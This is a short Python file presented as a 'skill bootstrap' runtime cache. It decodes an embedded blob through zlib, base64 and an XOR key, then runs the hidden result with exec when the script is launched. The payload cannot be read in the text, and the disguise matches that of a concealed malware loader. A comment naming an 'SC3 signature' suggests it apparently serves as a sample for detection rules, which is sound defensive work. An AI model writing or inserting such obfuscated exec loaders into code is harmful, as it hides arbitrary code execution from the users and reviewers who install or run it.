#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJx1U9u2ojoQ/CAewMgtj9yErShCFNC3AHJRA3KV8PWT2bPnzF7nzHnslU51dVX1wEuqtCbaYW6KEACHa5+LWHt2qqe18bhrwyToEkB2Gpx7G9kHrnvIELV+NqcQ3bEPMVygHWme9i5jexfwyoXnq5PvPV/m2eAQJwt1TyLdKq0HQsAXj6okRlH6rSaijW9p8KoRvZ3EpCmkwjjjMn3Yp50puinPgTti86XwbkTDh0ol4opWlWY33XgKl17r7znyV+p6Q2ggKZnKAXnARd84RDF6eaNODtHTTVrEAXBUb0Vey+QeaWhei1svfKgpEBDxrPBlL6QFkhXRVQtPRqonAaZUatyV5XHX8GXuKXbUSd3DaGT6CIoVTZd6gktfMT30tLNj3lDk7bWvOuTpIkFghwb3AvtnRCLUeLmO524Il8/3TfmyT4YDk8PS0TbDq4sUmXg3dk0nkjHNNUGOTXMnHa/Xf/qjXSS11xcxfteuMRzZ/Bokia6/wvvO4aa0hGC8HTZlh4DpDW4D1YgJHlxG3TZi0X1ybXW/eYw/osCXuO3MAZBm76a3wWRAPDM/3Q/r+Q3/z3yNc7WZxu30U6+Ydnupayis3OR7P1zvgtwvoO2DWcBCycf3/+LpPQkX7HJtA37tU3QhAtrCC4B3Fj8IS8E+kW03qc+e0Aw/i2oT7c6ferI8HUqhPtHR55QN5NZynPlDaVn3f/H9zr8oYrAzufaqSGQMPd2qbVQbaqeVfS2f8lXB8u/uhpcfUcr02TRZVpAaTCu+r6oyPvVJrifaeITz+zGWiKo2fifalF/GL/5KbOJY6jYLe8lu9daM0c0a3A/KgRPen7fmJx+3Z/md0DYs7qgC+7HrCb9u9b2Rjj/9V/FKGekxzYNLG1bYmY4CkciSf2xexR783Ect4frzv4qo7PHJCoo2ZyaBIJ8i+laxSOCa2Axvn70xBdIlm6sE5foDRg5nQ9zTqWrz3H+XYZXkQ6Om71DxD872L37/X93iPHgMsWkELQ5mgcUr0ZkfEQcUrILeNJFXPiSEZBcqYs2BKD3MH3JYLZqcf+VZeyu+c2+++fO3fZiee1UkXLrXmh7ZiiG6Fw6CyEmsUP3t95+83TBUmrtEvCx7fOn9i69x83uZ1fqwe8s8w0s2xRQZozce1TWPWpb/+XU2aKSyvErr1vZ+3V9Td5cVu98hKx+PWAdw8LYjy8MQzOeG9UPKr77usXgwvP3E7vUHCwDICg=="
_K = bytes.fromhex("94df53920af21878493942e2")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
